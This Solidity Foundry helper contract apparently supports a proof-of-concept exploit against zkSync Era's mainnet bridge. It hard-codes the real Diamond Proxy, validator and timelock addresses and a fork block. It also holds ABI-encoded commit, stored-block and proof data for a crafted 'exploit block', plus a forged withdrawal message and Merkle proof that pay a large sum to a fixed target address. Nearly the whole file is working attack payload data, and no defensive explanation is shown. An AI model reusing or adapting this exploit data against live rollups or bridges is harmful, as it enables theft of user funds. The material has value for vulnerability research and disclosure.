// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "era-contracts/ethereum/contracts/zksync/interfaces/IExecutor.sol";
import { CommonBase } from "forge-std/Base.sol";

contract ExploitData is CommonBase {
    address constant ZKSYNC_DIAMOND_PROXY = 0x32400084C286CF3E17e7B677ea9583e60a000324;
    address constant ZKSYNC_VALIDATOR_EOA = 0x3527439923a63F8C13CF72b8Fe80a77f6e572092;
    address constant ZKSYNC_VALIDATOR_TIMELOCK = 0x3dB52cE065f728011Ac6732222270b3F2360d919;
    address constant WITHDRAWAL_TARGET = 0xB49bf876BE26435b6fae1Ef42C3c82c5867Fa149;
    uint256 constant TARGET_BLOCK = 18083999;

    string constant COMMIT_CALLDATAS_PATH = "./data/commit_calldatas.txt";
    string constant PROVE_CALLDATAS_PATH = "./data/prove_calldatas.txt";
    string constant EXECUTE_CALLDATAS_PATH = "./data/execute_calldatas.txt";

    /**
     * @notice closes and resets the calldata files, allowing them to be read from the start again
     */
    function resetCalldataFiles() internal {
        vm.closeFile(COMMIT_CALLDATAS_PATH);
        vm.closeFile(PROVE_CALLDATAS_PATH);
        vm.closeFile(EXECUTE_CALLDATAS_PATH);
    }

    function readNextBytes(string memory path) internal view returns (bytes memory) {
        string memory line = vm.readLine(path);
        if (bytes(line).length > 0) {
            return vm.parseBytes(line);
        } else {
            return hex"";
        }
    }

    /**
     * @notice read the next line of the commitBlocks calldatas to replay
     */
    function readNextCommitCalldata() internal view returns (bytes memory result) {
        result = readNextBytes(COMMIT_CALLDATAS_PATH);
    }

    /**
     * @notice read the next line of the proveBlocks calldatas to replay
     */
    function readNextProveCalldata() internal view returns (bytes memory result) {
        result = readNextBytes(PROVE_CALLDATAS_PATH);
    }

    /**
     * @notice read the next line of the executeBlocks calldatas to replay
     */
    function readNextExecuteCalldata() internal view returns (bytes memory result) {
        result = readNextBytes(EXECUTE_CALLDATAS_PATH);
    }

    /**
     * @notice returns the StoredBlockInfo for the block preceeding our exploit block
     */
    function getPrevStoredBlock() internal pure returns (IExecutor.StoredBlockInfo memory result) {
        result = IExecutor.StoredBlockInfo({
            blockNumber: 199391,
            blockHash: 0x99ce9c194561594cf032f38ecd2d5574fe6ef48a5e7c2cd80c7a80de9ff9682f,
            indexRepeatedStorageChanges: 118112300,
            numberOfLayer1Txs: 76,
            priorityOperationsHash: 0x455f7c977034975fe18a1c3b7ff17e466d5870c9f7db73c1370c885e0f385e4f,
            l2LogsTreeRoot: 0xcba0dd179243123a8049eb3e1482e96d0a1583481526ff3d3acda43c619cad6c,
            timestamp: 1694082651,
            commitment: 0x6c7413829d0cc68f37d3d2cac96625319352a698dd55d8624d4c8ffdca66c3ab
        });
    }

    /**
     * @notice returns the CommitBlockInfo for the exploit block
     */
    function getExploitCommitBlock() internal pure returns (IExecutor.CommitBlockInfo memory result) {
        result = abi.decode(hex"00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000030ae0000000000000000000000000000000000000000000000000000000006531340f00000000000000000000000000000000000000000000000000000000070a402d77a09003f812e61feea7cd70c230506cb9a1dbe9d0a74492eddd1645a601fafe000000000000000000000000000000000000000000000000000000000000000030e7f07bc7bea588cddfc4535be35bbd3d6ca9b04142e469cf6788bbadbb4d9cc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000004a00000000000000000000000000000000000000000000000000000000000000044000000010261e9c52fd985504eb72b09a9b90952f68535f7d683846fbc946a7463c10ed999ce9c194561594cf032f38ecd2d5574fe6ef48a5e7c2cd80c7a80de9ff9682f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f400000006000000000022dbe9000000000000000000000000000000010000000000000000000000000000000e000000000000002f0000000000000000000000000000000000000000000021f6bfb7b8c4ffb5bf2c000000000124518f000000000000000000000000000000000000000000000000000050c4fdb05788000000000022d2500000000000000000000000000000000000000000000000000000177a7605074100000000000000230000000000000000000000000000000000000000000000000000000000000001000000000000002400000000000000000000000000030ae00000000000000000000000006531340f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000b40000000200000000000000000000000000000000000000000000800b000000000000000000000000000000000000000000000000000000006531340f99ce9c194561594cf032f38ecd2d5574fe6ef48a5e7c2cd80c7a80de9ff9682f000100000000000000000000000000000000000000008008000000000000000000000000000000000000000000000000000000000000800aa21a106d94ea5e84ba4c0256286e1525cbfb3add53121a2ed3beeed8941905cd0000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000386c0960f9b49bf876be26435b6fae1ef42c3c82c5867fa14900000000000000000000000000000000000000000000152d000013371337133700000000000000000000000000000000000000000000000000000000000000000000000000000000", (IExecutor.CommitBlockInfo));
    }

    /**
     * @notice returns the StoredBlockInfo for the exploit block
     */
    function getExploitStoredBlock() internal pure returns (IExecutor.StoredBlockInfo memory result) {
        result = abi.decode(hex"0000000000000000000000000000000000000000000000000000000000030ae077a09003f812e61feea7cd70c230506cb9a1dbe9d0a74492eddd1645a601fafe00000000000000000000000000000000000000000000000000000000070a402d0000000000000000000000000000000000000000000000000000000000000000c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a47030e7f07bc7bea588cddfc4535be35bbd3d6ca9b04142e469cf6788bbadbb4d9c000000000000000000000000000000000000000000000000000000006531340f25c940272ef6e8fca89ae2b21b6e043e6dce2e8d353636b698249eac702200d9", (IExecutor.StoredBlockInfo));
    }

    /**
     * @notice returns the ProofInput for the exploit block
     */
    function getExploitProofInput() internal pure returns (IExecutor.ProofInput memory result) {
        result = abi.decode(hex"0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000042bd570126c8824a8a0532419ed00fb7dc09dfe886d2d753ce8d46f663c6f9a8b0c221c248bcc91b2069c8ac35fee79658978e1ad9bec5e509449a8665600c52a2f9d7966fab189810af62280a350c2e91bb49d6a785c4ded38425172af22d2f005c9d3a6bd9d1a30584be3d2e247b60d43bf593e2de120322a24231a1774afba000000000000000000000000000000000000000000000000000000000000002c0e5b5a25774750d9643f11e978dfbc2e521a8502a9b538169e6c760c49c21ffd0bea8a02f67b1a2ccf60b36b331d7e4ab6595f374e014354531500390ef990e2072a552f78f696404823c12471cc7884a8f68190178eec607816e32ff31ea54123039f2b62a6a6592aa6a079e0b0bdf83d4f237dbbf0d906232b220c5e29d47e16bbbb44e9124045596c58d2fe17dfc75ef4a78672f2c77678c2b10fba44df8504b9b56fe724136084c8b36b44169112a20e457401ec71b85ff6c58bc42fa82c21e344844ea516f193cc1424115aeb6db167654110a6b25ff75e5944aa747fc7186bfbdb3225e5ed314627eec6871498f972e1b086239bc4862233ec869167192cc489106ba4eb1b6dac12b95e6564539d226ba28f6886fd8f82148d84912a3e04367004852e75baa4156ab1a49da2ab80d62a8436b8bd40fbf11c9d6391e94619ce3763a1953c61d716b45edce1e4e45e979f20b4001058ce0e966d64e5eea2101273ca789066e919e5e0fe8e6194af08ca5eccda0b7b63738973df9e2a508c0a10c2b00b34f6ad03dae5bc2533d91bd5fe6cd8a2c08d723673e005523a0ff224c08e68a09819dd17b6e61b034840b438c618fe64089fb504c078870c427d0416f201ed95fc5215b3b32630218486537817c9df2ba4378b800e069df481006411b6e46325c10f6dc1ff141347e91f2adc141dcb1e148aef0b2200f4525459800786f54f646339499d24a15af43ca44613667fd2c6cbcd85c9bb660fb6010d6702311171ba502efec05913e3017eb0a5506a28330496b99378e5b5061fbfa5ba271ea28778e384e040a4f70b5690e7ca350ea29a6159def28f47752e76033bbe17b0fc6154791f1f52e464579d5ef5544b444c5fdca8d72d675c0e8c2d2550fd1f802c3b45714bb58fd3b10c61c9613a9926556bce212e35ec5cbef571cc4379047b441316cd242467798b09085d39db720839cfd70657af00e9d01ba82ef1550efd785a169c409f9d7b8bffb620686ac45d73bb25efb67c97ea0fcd5b0292730c498880afdfa90c70917d05b963ed1a02ecb265530c18c18f9d282dcfbd3c152d92a4cc573629bdbc63ffc9619fbc4c0f382d096bfaed05344938abcc9030372aa0db1d386b31ab800b0572f6da47e1d1298db30511d3fa07439afb18ab5b97152d146de1ab3b9d988cfa3cfb0dfe809d6371ae443e97a1f19d4a5a742447f924fc76623b19de0811d5b73e32254b5df079e82e4f86b4ffdede0875c7ce98ec067e8ebf241a93ac4b3943c5738c0c6602986427a198a5d7a56ad5cd804c015a28bfd24ce4bdd875e06bd1c7138c92da6d20556eeff018047e18621b3aff18f90140f4ea8fdeec0b8ae4c878b8e9db7159b09e663f9cf3e282229545ef586aa200a434eee99292938cf6db6271cd873d5c47ab6eb52b25a555d6d0d631a5312906c5420a002c8deb6a97608f282d1af922bc4897bdbf317c150a7b525e81238f2f85168c4c931d6fd66df56b75b9b7b85b81ec2e9d06ae444ba9987d7b6da2020e40a610ccf104cc6b6b4feb69c64bdf5c3a8c6fab83f4fd37db9986e19297912fe9a70ab18a98333e334d212e0c10d59bcb169568e5ea4dc8cb8d7547cc2b2928cb4ae43c27c18b71a0320251b8a93c11bbf19f1db7f2c0732fca57dabb6f3a2424bb6fd0270ad5106d2e9e4812fcfba27ac6bcf0d3975a72e3ad170aea237f278154771a2aca03ed7db26799d1552dc0c42e75d8ecf67a681722d20d215b9209407abbd79dc22ed32755489e7d89c2bd2ddef89a65a8312f0cf64a4dbe24ff28dc37bee19710b0207c40908b8b555cd1151fa08aeec3051976a1a853db8ba90e648d792098acd3549c3605abac7c1c17d0b7066b4fb897a7aff2b667111c950672707d9d6f2615b4ce61c4005449dd97abb88b7c985d2970eba2898769ae74206a95556595a44e10257a8de0efb8a63d0b586e4f35cf70662e4437f142662f", (IExecutor.ProofInput));
    }

    /**
     * @notice returns the exploit withdrawal details from the exploit block
     */
    function getExploitWithdrawalDetails() internal pure returns (
        uint256 l2Block,
        uint256 l2MessageIndex,
        uint16 l2TxNumberInBlock,
        bytes memory message,
        bytes32[] memory merkleProof
    ) {
        l2Block = 199392;
        l2MessageIndex = 1;
        l2TxNumberInBlock = 0;
        message = hex"6c0960f9b49bf876be26435b6fae1ef42c3c82c5867fa14900000000000000000000000000000000000000000000152d0000133713371337";
        merkleProof = new bytes32[](9);
        merkleProof[0] = 0x3d6cc8e90de60fe35ee5965348bd2eadd37cfae9d8569e2975642433c703a1db;
        merkleProof[1] = 0xc3d03eebfd83049991ea3d3e358b6712e7aa2e2e63dc2d4b438987cec28ac8d0;
        merkleProof[2] = 0xe3697c7f33c31a9b0f0aeb8542287d0d21e8c4cf82163d0c44c7a98aa11aa111;
        merkleProof[3] = 0x199cc5812543ddceeddd0fc82807646a4899444240db2c0d2f20c3cceb5f51fa;
        merkleProof[4] = 0xe4733f281f18ba3ea8775dd62d2fcd84011c8c938f16ea5790fd29a03bf8db89;
        merkleProof[5] = 0x1798a1fd9c8fbb818c98cff190daa7cc10b6e5ac9716b4a2649f7c2ebcef2272;
        merkleProof[6] = 0x66d7c5983afe44cf15ea8cf565b34c6c31ff0cb4dd744524f7842b942d08770d;
        merkleProof[7] = 0xb04e5ee349086985f74b73971ce9dfe76bbed95c84906c5dffd96504e1e5396c;
        merkleProof[8] = 0xac506ecb5465659b3a927143f6d724f91d8d9c4bdb2463aee111d9aa869874db;
    }
}
